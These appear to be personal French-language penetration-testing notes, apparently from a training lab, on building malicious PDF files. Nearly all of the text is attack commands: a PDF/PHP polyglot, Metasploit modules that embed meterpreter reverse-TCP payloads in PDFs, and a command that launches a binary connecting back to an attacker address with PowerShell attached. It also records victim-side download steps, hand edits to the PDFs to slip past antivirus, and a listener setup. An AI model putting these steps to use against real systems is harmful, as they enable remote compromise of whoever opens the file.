## pdf
=========================================================================================================
https://www.digital.security/fr/blog/contourner-la-detection-av-sur-un-exploit-pdf
https://null-byte.wonderhowto.com/how-to/hack-like-pro-embed-backdoor-connection-innocent-looking-pdf-0140942/

==================
$ cat bad.pdf.php 
%PDF-1.5
<?php phpinfo(); ?>


======================================
tentative de pdf malicieu:

use exploit/windows/fileformat/adobe_pdf_embedded_exe
set payload windows/meterpreter/reverse_tcp
set FILENAME documentation.pdf
set LHOST 10.10.14.19
set LPORT 80
run

#sur la machine victime:
iwr http://10.10.14.19:8000/documentation.pdf -outfile documentation.pdf
#pdf sur la machine mais pas de reverse shell
=======================================


use exploit/windows/fileformat/adobe_utilprintf
set FILENAME doc2.pdf
set PAYLOAD windows/exec
set CMD 'c:\tmp\bouf.exe 10.10.14.19 80 -e powershell.exe'
exploit

#sur la machine victime:
iwr http://10.10.14.19:8000/doc2.pdf -outfile documentation2.pdf
#doc posé mais shooté par l'AV


========================================

#creation pdf
use exploit/windows/fileformat/adobe_cooltype_sing
set OUTPUTPATH .
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.19
set lport 80
run

obfuscation:
pdftk doc3.pdf output doc3unc.pdf uncompress #decompression
strings doc3unc.pdf |grep var #vue de l'exploit en js
#modfi a la main des strings hors js
iwr http://10.10.14.19:8000/doc3.pdf -outfile documentation3.pdf

#shooté par l'AV

use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.19
set lport 80
run

